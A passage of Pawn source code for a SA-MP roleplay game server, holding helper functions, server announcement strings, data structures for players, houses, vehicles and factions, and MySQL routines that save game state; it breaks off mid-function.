/*stock ShowHouseMenu(playerid)
{
	new name[24];
	GetPlayerName(playerid, name, MAX_PLAYER_NAME);

	ShowPlayerDialog(playerid, DIALOG_HOUSE+11, DIALOG_STYLE_TABLIST_HEADERS, "Mobila", "Item\tActiune\nCumpara mobila\tPozitioneaza mobilier in propria casa...\nEditeaza mobila\tSchimba pozitia unui mobilier din propria casa...\nVinde mobila\tVinde un mobilier de care nu ai nevoie...", "Selecteaza", "Inapoi");
	return 1;
}*/
// GETDISTANCEBETWEENPLAYERS
public Float:GetDistanceBetweenPlayers(p1,p2)
{
	new	Float:x1,
		Float:y1,
		Float:z1,
		Float:x2,
		Float:y2,
		Float:z2;
	if(!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
	{
		return -1.00;
	}
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

stock ini_GetKey(line[])
{
	new keyRes[256];
	keyRes[0] = 0;
    if ( strfind( line , "=" , true ) == -1 ) return keyRes;
    strmid( keyRes , line , 0 , strfind( line , "=" , true ) , sizeof( keyRes) );
    return keyRes;
}

stock ini_GetValue(line[])
{
	new valRes[256];
	valRes[0]=0;
	if ( strfind( line , "=" , true ) == -1 ) return valRes;
	strmid( valRes , line , strfind( line , "=" , true )+1 , strlen( line ) , sizeof( valRes ) );
	return valRes;
}
strtok(const string[], &index)
{
	new length = strlen(string);
	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index;
	new result[20];
	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}
	result[index - offset] = EOS;
	return result;
}

stock InvalidWeapons(playerid)
{
	new weap = GetPlayerWeapon(playerid);
	if(weap == 0)
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

stock IsKeyJustDown(key, newkeys, oldkeys)
{
	if((newkeys & key) && !(oldkeys & key))
	return 1;

	return 0;
}

// GETDISTANCE2
stock GetDistance2( Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2 )
{
   return floatround( floatsqroot( ( ( x1 - x2 ) * ( x1 - x2 ) ) + ( ( y1 - y2 ) * ( y1 - y2 ) ) + ( ( z1 - z2 ) * ( z1 - z2 ) ) ) );
}

// GETDISTANCEBETWEENPOINTS
stock Float:GetDistanceBetweenPoints(Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2)
{
    return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

stock GetClosestVehicle2(playerid, Float:dis)
{
	new Float:X,
		Float:Y,
		Float:Z;
	if(GetPlayerPos(playerid, X, Y, Z))
	{
		new vehicleid = INVALID_VEHICLE_ID;
		for(new v, Float:temp, Float:VX, Float:VY, Float:VZ; v != MAX_VEHICLES; v++)
		{
			if(GetVehiclePos(v, VX, VY, VZ))
			{
				VX -= X, VY -= Y, VZ -= Z;
				temp = VX * VX + VY * VY + VZ * VZ;
				if(temp < dis) dis = temp, vehicleid = v;
			}
		}
		dis = floatpower(dis, 0.5);
		return vehicleid;
	}
	return INVALID_VEHICLE_ID;
}

// ISVEHICLEINRANGEOFPOINT
stock IsVehicleInRangeOfPoint(vehicleid, Float: radius, Float:x, Float:y, Float:z) {

	new Float:Floats[6];

	GetVehiclePos(vehicleid, Floats[0], Floats[1], Floats[2]);
	Floats[3] = (Floats[0] -x);
	Floats[4] = (Floats[1] -y);
	Floats[5] = (Floats[2] -z);
	if (((Floats[3] < radius) && (Floats[3] > -radius)) && ((Floats[4] < radius) && (Floats[4] > -radius)) && ((Floats[5] < radius) && (Floats[5] > -radius)))
		return 1;
	return 0;
}

// GETXYINFRONTOFPLAYER
stock Float:GetXYInFrontOfPlayer(playerid, &Float:x, &Float:y, Float:distance)
{
    new Float:a;
    GetPlayerPos(playerid, x, y, a);
    if (IsPlayerInAnyVehicle(playerid))
        GetVehicleZAngle(GetPlayerVehicleID(playerid), a);
    else
        GetPlayerFacingAngle(playerid, a);
    x += (distance * floatsin(-a, degrees));
    y += (distance * floatcos(-a, degrees));
    return a;
}

enum beforeSpectateInfo //iFordawin
{
 	Float: pOldPos[3],
 	pWorld,
 	pInt,
 	pState,
 	pInVehicle,
 	bool: pSpectating
};
new BeforeSpectate[MAX_PLAYERS][beforeSpectateInfo];

// ANUNTURI
new 	RandomMSG[][] = {
	"{0066FF}SERVER: {FFFFFF}Address Ucp Server T-Zone Ucp.T-Zone.Ir Mibashad.",
	"{0066FF}SERVER: {FFFFFF}Shoma Mitavanid Moshkelat KhodRa Dar /n Matrah Konid.",
	"{0066FF}SERVER: {FFFFFF}Baray Moshahede Bartarin Gang Ha Az Cmd /Top Estefade Konid.",
	"{0066FF}SERVER: {FFFFFF}Ip TeamSpeak Server : TS.T-ZONE.IR.",
	"{0066FF}SERVER: {FFFFFF}Baray Kasb Etelaat Bishtar Dar Mored Premium Account Az cmd /premium Estefade Konid.",
	"{0066FF}SERVER: {FFFFFF}Baray Kasb Etelaat Dar Mored Account Vip Az Cmd /vip Estefade Konid.",
	"{0066FF}SERVER: {FFFFFF}Dostan Khod Ra Be Server Davat Konid Va Barande Javayz Nafis Shavid /referral.",
	"{0066FF}SERVER: {FFFFFF}Shoma mitavanid Kasb Va Kar Khod Ra Shoro Konid (/trade).",
	"{0066FF}SERVER: {FFFFFF}Daca ai probleme sau nelamuriri foloseste /report.",
	"{0066FF}SERVER: {FFFFFF}Foloseste /carradio pentru a asculta radio in masina.",
	"{0066FF}SERVER: {FFFFFF}Vaqti Rob Point Shoma 10/10 shod Mitavanid az Cmd (/rob) Estefade Konid.",
	"{0066FF}SERVER: {FFFFFF}Estefade Az Hargune Cheat Ban Permanet Be Hamrah Darad.",
	"{0066FF}SERVER: {FFFFFF}Baray moshahede Turf Hay Server Az Cmd /turfs Estefade Konid."
};

new 	RandomMSGENG[][] = {
	"{0066FF}SERVER: {FFFFFF}Visit wwww.Magic-Gaming.tk/forum.",
	"{0066FF}SERVER: {FFFFFF}If you have any questions, use /n.",
	"{0066FF}SERVER: {FFFFFF}Use /locations to find locations on the server.",
	"{0066FF}SERVER: {FFFFFF}Use /jobs to see available jobs.",
	"{0066FF}SERVER: {FFFFFF}To learn more about using premium account use /premium.",
	"{0066FF}SERVER: {FFFFFF}To learn more about using VIP account use /vip.",
	"{0066FF}SERVER: {FFFFFF}If you have any problems, use /report.",
	"{0066FF}SERVER: {FFFFFF}Use /carradio to listen to radio in the car.",
	"{0066FF}SERVER: {FFFFFF}If you have 10/10 Rob Points you can rob the bank(/rob).",
	"{0066FF}SERVER: {FFFFFF}Businesses with real money are prohibited. Those who were caught trying to do business with real money will get permanent ban.",
	"{0066FF}SERVER: {FFFFFF}Use /turfs to view the gang zones."
};

// POLICE SPIKES
enum spikeE
{
    sObjID,
	Float:sPos[4],
	sDeployer[MAX_PLAYER_NAME],
}
new SpikeInfo[MAX_SPIKES][spikeE];

// GANG TURFS - WAR
enum zInfo
{
    zID,
    zOwned,
    Float:zMinX,
    Float:zMinY,
    Float:zMaxX,
    Float:zMaxY
};
new TurfInfo[50][zInfo],
	Turfs[50];
new Float:LastPosition[MAX_PLAYERS][3];
new TeleportWarnings[MAX_PLAYERS];
new TeleportAllowed[MAX_PLAYERS];
enum wInfo
{
    wFaction,
	wAttacker,
	wTime,
};
new WarInfo[sizeof(TurfInfo)][wInfo],
	WarScoreF[16][sizeof(TurfInfo)],
	ucideri[MAX_PLAYERS][sizeof(TurfInfo)],
	decese[MAX_PLAYERS][sizeof(TurfInfo)],
	worstscoreat[sizeof(TurfInfo)],
	worstmemberat[sizeof(TurfInfo)],
	worstscoredf[sizeof(TurfInfo)],
	worstmemberdf[sizeof(TurfInfo)],
	bestscoreat[sizeof(TurfInfo)],
	bestmemberat[sizeof(TurfInfo)],
	bestscoredf[sizeof(TurfInfo)],
	bestmemberdf[sizeof(TurfInfo)],
	DeelayWar[16],
	InWar[16];

// SPECTATOR
enum pSpec
{
	Float:Coords[3],
	Float:sPx,
	Float:sPy,
	Float:sPz,
	sPint,
	sLocal,
	sCam,
};

new Unspec[MAX_PLAYERS][pSpec];

// CLAN
enum clanE
{
    cClanName[64],
	cClanMOTD[256],
	cClanRankName1[32],
	cClanRankName2[32],
	cClanRankName3[32],
	cClanRankName4[32],
	cClanRankName5[32],
	cClanRankName6[32],
	cClanRankName7[32],
	cClanTag[32],
	cClanTagType,
	cClanExpire,
	cClanActive,
	cClanSlots,
	cClanVerificat,
	cClanScor,
	cConectari,
	cClanColor[10],
};
new ClanInfo[MAX_CLANS][clanE];

// PLAYER ACCOUNT
enum pInfo
{
	pKey[128],
	pColor,
	pCuvant[255],
	pNrTel[255],
	pNormalName[30],
	pLevel,
	pCasatorit,
	pDailyBonus,
	pRunners,
	pPHeals,
	pLGiven,
	pWDeaths,
	pWKills,
	pMUsed,
	pNews,
	pDDeposit,
	pMDeposit,
	pLives,
	pOrders,
	pContracts,
	pDConfiscate,
	pLConfiscate,
	pTickets,
	pArrestss,
	pAdmin,
	pMP3,
	pHelper,
	pPremiumAccount,
	pPremiumPoints,
	pConnectTime,
	pReg,
	pSex,
	pAge,
	pOrigin,
	pMuted,
	pMuteTime,
	pGasCan,
	pExp,
	pPaydayuri,
	pCash,
	pAccount[255],
	pBAccLY,
	pBAcc,
	pCrimes,
	pKills,
	pDeaths,
	pArrested,
	pWantedDeaths,
	pPhoneBook,
	pPhone,
 	pWantedLevel,
 	pSelected[MAX_PLAYER_NAME],
	pFishes,
	pJob,
	pPayCheck,
	pHeadValue,
	pJailed,
	pJailTime,
	pMats,
	pDrugs,
	pLeader,
	pMember,
	pRank,
	pGlasses,
	pHats,
	pFACWarns,
	pFpunish,
	pLawyer,
	pFishSkill,
	pFlyMode,
	pSpawnChange,
	pFishPrice,
	Float:pHealth,
	Float:pSHealth,
	pInt,
	pLocal,
	pTeam,
	pRequestingBackup,
	pModel,
	pPnumber,
	pPhousekey,
	pPhousekey2,
	pPbiskey,
	Float:pPos_x,
	Float:pPos_y,
	Float:pPos_z,
	pCarLicSuspend,
	pGunLicSuspend,
	pCarLicT,
	pCarLic,
	pVip,
	pColors,
	pReferral,
	pFlyLicT,
	pFlyLic,
	pBoatLicT,
	pBoatLic,
	pGunLicT,
	pGunLic,
	pPayDay,
 	pRobSkill,
 	pRobTimes,
 	pRobRem,
 	pTruckSkill,
 	pTruckTimes,
 	pTruckRem,
 	pFarmSkill,
 	pFarmTimes,
 	pFarmRem,
	pPizzaSkill,
	pPizzaTimes,
	pPizzaRem,
	pArmsSkill,
	pArmsTimes,
	pArmsRem,
	pCurierRem,
	pCurierSkill,
	pCurierTimes,
	pCarieraRem,
	pCarieraSkill,
	pCarieraTimes,
	pCimentSkill,
	pCimentTimes,
	pDailyPayDay,
	pCimentRem,
	pBusSkill,
	pBusTimes,
	pBusRem,
 	pFishTimes,
 	pFishRem,
	pRob,
	pTut,
	pWarns,
	pLanguage,
	pFuel,
    pSleeping,
	pGarbageTime,
    pRented,
    pSpeaker,
    pWTalkie,
   	pEmail[200],
    pRegistredDate[200],
	pClanTag,
	pClan,
	pHitT,
 	pCRank,
	pCWarns,
	pSQLID,
	pPcarkey,
	pCarkey7,
	pCarkey8,
	pCarkey9,
	pCarkey10,
	pCarkey11,
	pCarkey12,
	pCarkey13,
	pCarkey14,
	pCarkey15,
	pmotokey,
	phelikey,
	pprcarkey,
	pprcarkey2,
	pPPluscarkey,
	pPPluscarkey2,
	pPlusSlot1,
	pPlusSlot2,
    pVictim[64],
    pAccused[64],
	pCrime1[184],
	pCrime2[184],
	pCrime3[184],
	pNMessage[128],
	pNMessage2[128],
	pNewbieEnabled,
	pFirstAnswer,
	pNMuted,
	pNewbieTimeout,
	pHelpedPlayers,
	pHToken,
	pHCar,
	pNRE,
	pStatus,
	pALeader,
	pFWorks,
	pVirtualPD,
	pFactionTime,
	pCredits,
	pHost[25],
	pOneHost,
	pHiddenColor,
	pGiftTime,
	pFightStyle,
	pHUD1,
	pHUD2,
	pHUD3,
	pFPS,
	pGPoints,
	pDrunkLevelLast,
	pPaintBallG,
	pPaintBallKills,
	pPhoneBlock,
	pNextNotification
};
new PlayerInfo[MAX_PLAYERS][pInfo];

enum bpInfo
{
	bpName[30],
	bpNumar1,
	bpNumar2,
	bpNumar3,
	bpNumar4,
	bpNumar5,
	bpNumar6,
	bpNumar7,
	bpNumar8,
	bpNumar9,
	bpNumar10,
	bpNume1[30],
	bpNume2[30],
	bpNume3[30],
	bpNume4[30],
	bpNume5[30],
	bpNume6[30],
	bpNume7[30],
	bpNume8[30],
	bpNume9[30],
	bpNume10[30]
}
new BlockPhone[MAX_PLAYERS][bpInfo];
// HOUSE
enum hInfo
{
	hID,
	Float:hEntrancex,
	Float:hEntrancey,
	Float:hEntrancez,
	Float:hExitx,
	Float:hExity,
	Float:hExitz,
	hOwner[25],
	hDiscription[64],
	hValue,
	hHel,
	hArm,
	hInterior,
	hLock,
	hOwned,
	hRent,
	hRentabil,
	hTakings,
	hLevel,
	hVirtual
};
new HouseInfo[1000][hInfo],
	Text3D:HouseLabel[1000],
	HousePickup[1000];

// BUSSINES
enum bInfo
{
	bID,
    bOwned,
	bOwner[25],
	bMessage[50],
	Float:bEntranceX,
	Float:bEntranceY,
	Float:bEntranceZ,
	Float:bExitX,
	Float:bExitY,
	Float:bExitZ,
	bLevelNeeded,
	bBuyPrice,
	bEntranceCost,
	bTill,
	bLocked,
	bInterior,
	bVirtual,
	bSbiz,
	bType
};
new BizzInfo[55][bInfo],
	Text3D:BizzLabel[sizeof(BizzInfo)];


enum cInfo
{
	cID,
	cModel,
	Float:cLocationx,
	Float:cLocationy,
	Float:cLocationz,
	Float:cAngle,
	cColorOne,
	cColorTwo,
	cOwner[MAX_PLAYER_NAME],
	cDescription[128],
	cValue,
	cLicense[64],
	cOwned,
	cLock,
	cNewEngine,
	cTimed,
	cInscarprice,
	cInsurancecar,
	Float:cKM,
	cSell,
	Float:cHP,
	cDamage1,
	cDamage2,
	cDamage3,
	cDamage4,
	cGas,
	mod1,
	mod2,
	mod3,
	mod4,
	mod5,
	mod6,
	mod7,
	mod8,
	mod9,
	mod10,
	mod11,
	mod12,
	mod13,
	mod14,
	mod15,
	mod16,
	mod17,
	cDays,
	cPaintJ,
	vArma1,
	vArma2,
	vArma3,
	vGArma1,
	vGArma2,
	vGArma3,
	vBani,
	vDroguri
};

new CarInfo[35000][cInfo],
	caridxx[MAX_VEHICLES];
	
// VEHICLES
#define OwnedVeh(%0) 		caridxx[%0]
new Float:dspozitii[14][3] = 
{
	{1550.5708,-1240.0103,17.4062}, // carpos1
	{1555.0045,-1239.9630,17.4062}, // carpos2
	{1561.8953,-1239.8954,17.4062}, // carpos3
	{1570.1857,-1239.8862,17.4526}, // carpos4
	{1577.8335,-1240.1543,17.5217}, // carpos5
	{1584.1110,-1239.9717,17.5784}, // carpos6
	{1590.0092,-1240.1063,17.5079}, // carpos7
	{1597.8423,-1239.6263,17.4597}, // carpos8
	{1599.0118,-1217.8043,17.4624}, // carpos9
	{1583.2213,-1217.2081,17.5157}, // carpos10
	{1573.7023,-1216.7064,17.4479}, // carpos11
	{1566.3514,-1216.6251,17.4212}, // carpos12
	{1557.4608,-1216.7189,17.4132}, // carpos13
	{1551.4907,-1216.3243,17.4217} // carpos14

};
new spoiler[20][0] = {
	{1000},
	{1001},
	{1002},
	{1003},
	{1014},
	{1015},
	{1016},
	{1023},
	{1058},
	{1060},
	{1049},
	{1050},
	{1138},
	{1139},
	{1146},
	{1147},
	{1158},
	{1162},
	{1163},
	{1164}
};

new nitro[3][0] = {
	{1008},
	{1009},
	{1010}
};

new fbumper[23][0] = {
	{1117},
	{1152},
	{1153},
	{1155},
	{1157},
	{1160},
	{1165},
	{1167},
	{1169},
	{1170},
	{1171},
	{1172},
	{1173},
	{1174},
	{1175},
	{1179},
	{1181},
	{1182},
	{1185},
	{1188},
	{1189},
	{1192},
	{1193}
};

new rbumper[22][0] = {
	{1140},
	{1141},
	{1148},
	{1149},
	{1150},
	{1151},
	{1154},
	{1156},
	{1159},
	{1161},
	{1166},
	{1168},
	{1176},
	{1177},
	{1178},
	{1180},
	{1183},
	{1184},
	{1186},
	{1187},
	{1190},
	{1191}
};

new exhaust[28][0] = {
	{1018},
	{1019},
	{1020},
	{1021},
	{1022},
	{1028},
	{1029},
	{1037},
	{1043},
	{1044},
	{1045},
	{1046},
	{1059},
	{1064},
	{1065},
	{1066},
	{1089},
	{1092},
	{1104},
	{1105},
	{1113},
	{1114},
	{1126},
	{1127},
	{1129},
	{1132},
	{1135},
	{1136}
};

new bventr[2][0] = {
	{1142},
	{1144}
};

new bventl[2][0] = {
	{1143},
	{1145}
};

new bscoop[4][0] = {
	{1004},
	{1005},
	{1011},
	{1012}
};

new rscoop[17][0] = {
	{1006},
	{1032},
	{1033},
	{1035},
	{1038},
	{1053},
	{1054},
	{1055},
	{1061},
	{1067},
	{1068},
	{1088},
	{1091},
	{1103},
	{1128},
	{1130},
	{1131}
};

new lskirt[21][0] = {
	{1007},
	{1026},
	{1031},
	{1036},
	{1039},
	{1042},
	{1047},
	{1048},
	{1056},
	{1057},
	{1069},
	{1070},
	{1090},
	{1093},
	{1106},
	{1108},
	{1118},
	{1119},
	{1133},
	{1122},
	{1134}
};

new rskirt[21][0] = {
	{1017},
	{1027},
	{1030},
	{1040},
	{1041},
	{1051},
	{1052},
	{1062},
	{1063},
	{1071},
	{1072},
	{1094},
	{1095},
	{1099},
	{1101},
	{1102},
	{1107},
	{1120},
	{1121},
	{1124},
	{1137}
};

new hydraulics[1][0] = {
	{1087}
};

new vbase[1][0] = {
	{1086}
};

new rbbars[4][0] = {
	{1109},
	{1110},
	{1123},
	{1125}
};

new fbbars[2][0] = {
	{1115},
	{1116}
};

new wheels[17][0] = {
	{1025},
	{1073},
	{1074},
	{1075},
	{1076},
	{1077},
	{1078},
	{1079},
	{1080},
	{1081},
	{1082},
	{1083},
	{1084},
	{1085},
	{1096},
	{1097},
	{1098}
};

new vlights[2][0] = {
	{1013},
	{1024}
};

// DEALERSHIP STOCK
enum vInfo
{
	vID,
	vStock,
	vPrice,
	vModel,
	vSpeed,
	vName[255]
};
new Stock[102][vInfo];

// FACTIONS
enum Factions
{
	fID,
	fName[128],
	Float:fcX,
	Float:fcY,
	Float:fcZ,
	fMats,
	fDrugs,
	fBank,
	fPaydayMoney,
	fAnn[128],
	fWin,
	fLost,
	fMembers,
	fMaxMembers,
	fMinLevel,
	fApplication,
	fRankName1[64],
	fRankName2[64],
	fRankName3[64],
	fRankName4[64],
	fRankName5[64],
	fRankName6[64],
	fRankName7[64]
};
new DynamicFactions[16][Factions];

// GUN NAME
new GunNames[48][] =
{
	"Nothink",
	"Brass Knuckles",
	"Golf Club",
	"Nitestick",
	"Knife",
	"Baseball Bat",
	"Showel",
	"Pool Cue",
	"Katana",
	"Chainsaw",
	"Purple Dildo",
	"Small White Dildo",
	"Long White Dildo",
	"Vibrator",
	"Flowers",
	"Cane",
	"Grenade",
	"Tear Gas",
	"Molotov",
	"Vehicle Missile",
	"Hydra Flare",
	"Jetpack",
	"Glock",
	"Silenced Colt",
	"Desert Eagle",
	"Shotgun",
	"Sawn Off",
	"Combat Shotgun",
	"Micro UZI",
	"MP5",
	"AK47",
	"M4",
	"Tec9",
	"Rifle",
	"Sniper Rifle",
	"Rocket Launcher",
	"HS Rocket Launcher",
	"Flamethrower",
	"Minigun",
	"Satchel Charge",
	"Detonator",
	"Spraycan",
	"Fire Extinguisher",
	"Camera",
	"Nightvision",
	"Infrared Vision",
	"Parachute",
	"Fake Pistol"
};

new Peds[115][1] = {
{1},{2},{6},{7},{9},{10},{14},{15},{16},{18},{19},{20},{21},{22},{23},{24},{25},{26},{27},{28},
{29},{30},{31},{32},{33},{34},{35},{36},{37},{38},{39},{41},{43},{44},{45},{47},{48},{49},{51},
{52},{53},{54},{63},{64},{66},{67},{68},{69},{73},{75},{77},{78},{79},{80},{81},{82},{83},{84},
{87},{88},{89},{94},{95},{96},{97},{99},{100},{101},{128},{129},{130},{131},{132},{133},{134},
{135},{136},{137},{138},{139},{140},{142},{143},{144},{145},{146},{154},{162},{170},{180},{177},
{176},{181},{182},{183},{184},{193},{201},{202},{203},{204},{221},{230},{234},{237},{241},{242},
{247},{248},{249},{250},{252},{254},{299},{293}
};

enum LIST_ANTIFLOOD
{
	lastCheck,
	floodRate
}
new AntiFlood_Data[MAX_PLAYERS][LIST_ANTIFLOOD];

// MAIN
main()
{
   print("Script loaded - TZ:RP by TopZone "SERVER_VERSION);
}

public HUpdate(hid, type)
{
	new var[256];
	switch(type)
	{
	    case hExitxx:
	    {
			format(var, sizeof(var), "UPDATE `houses` SET `Exitx`='%f' WHERE `ID`='%d'",HouseInfo[hid][hExitx], hid);
			mysql_query(SQL ,var);
	    }
	    case hExityx:
	    {
			format(var, sizeof(var), "UPDATE `houses` SET `Exity`='%f' WHERE `ID`='%d'",HouseInfo[hid][hExity], hid);
			mysql_query(SQL ,var);
	    }
	    case hExitzx:
	    {
			format(var, sizeof(var), "UPDATE `houses` SET `Exitz`='%f' WHERE `ID`='%d'",HouseInfo[hid][hExitz], hid);
			mysql_query(SQL ,var);
	    }
	    case hInteriorx:
	    {
			format(var, sizeof(var), "UPDATE `houses` SET `Interior`='%d' WHERE `ID`='%d'",HouseInfo[hid][hInterior], hid);
			mysql_query(SQL ,var);
	    }
        case hLevelx:
	    {
			format(var, sizeof(var), "UPDATE `houses` SET `Level`='%d' WHERE `ID`='%d'",HouseInfo[hid][hLevel], hid);
			mysql_query(SQL ,var);
	    }
	    case hValuex:
	    {
			format(var, sizeof(var), "UPDATE `houses` SET `Value`='%d' WHERE `ID`='%d'",HouseInfo[hid][hValue], hid);
			mysql_query(SQL ,var);
	    }
	}
	return 1;
}
// PLAYER SAVE
public Update(playerid, type)
{
	if(IsPlayerConnected(playerid))
	{
		new var[356];
		{
			switch(type)
			{
				case pVipx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `ContVip`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pVip], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pColorsx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Colors`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pColors], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pReferralx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Referral`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pReferral], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCashx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Money`='%d' WHERE `name`='%s'",GetPlayerCash(playerid), PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRunnersx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Runners`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pRunners], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPHealsx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `PHeals`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPHeals], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pLGivenx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `LGiven`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pLGiven], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pWKillsx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `WKills`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pWKills], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pWDeathsx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `WDeaths`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pWDeaths], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pMUsedx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `MUsed`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pMUsed], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pDDepositx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `DDeposit`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pDDeposit], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pMDepositx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `MDeposit`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pMDeposit], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pNewsx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `News`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pNews], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pLivesx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Live`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pLives], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pOrdersx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Orders`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pOrders], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pContractsx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Contracts`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pContracts], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pDConfiscatex:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `DConfiscate`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pDConfiscate], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pLConfiscatex:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `LConfiscate`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pLConfiscate], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pTicketsx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Tickets`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pTickets], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pArrestssx:
				{
				    mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Arrests`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pArrestss], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pRP:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Respect`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pExp], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCasatoritx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Casatorit`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCasatorit], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pPaydayurix:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Paydayuri`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pPaydayuri], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pBank:
				{
					new mymoney[LY_STRING_LEN];  
					GetLYString(PlayerInfo[playerid][pBAccLY], PlayerInfo[playerid][pBAcc], mymoney);  
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `Bank2`='%s' WHERE `name`='%s'",mymoney, PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarLicTx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CarLicT`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarLicT], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pCarLicSuspendx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `CarLicSuspend`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pCarLicSuspend], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pGunLicSuspendx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `GunLicSuspend`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pGunLicSuspend], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pFlyLicTx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `FlyLicT`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pFlyLicT], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pBoatLicTx:
				{
					mysql_format(SQL, var, sizeof(var), "UPDATE `users` SET `BoatLicT`='%d' WHERE `name`='%s'",PlayerInfo[playerid][pBoatLicT], PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,var,"","");
				}
				case pGunLicTx:
				{
